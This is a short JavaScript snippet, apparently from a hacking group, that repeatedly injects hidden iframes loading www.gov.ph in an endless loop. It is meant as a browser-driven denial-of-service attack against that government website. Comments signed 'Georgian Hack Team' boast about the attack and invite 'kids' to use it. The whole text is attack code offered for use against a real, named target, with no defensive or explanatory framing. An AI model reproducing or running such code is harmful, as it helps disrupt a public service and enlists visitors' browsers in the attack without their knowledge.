//Contributed by Flounder.Ge
//(c)Copyright 2016 - Georgian Hack Team

function _DDoS(url){
 document.body.innerHTML+='<iframe src="'+url+'" style="display:none;"></iframe>';
}
for(;;){
 setTimeout('_DDoS("http://www.gov.ph/")',10);
}

/* This code will take a **
** rock and roll with the**
** site www.gov.ph       **
** \m/ Enjoy this kids.  **
*/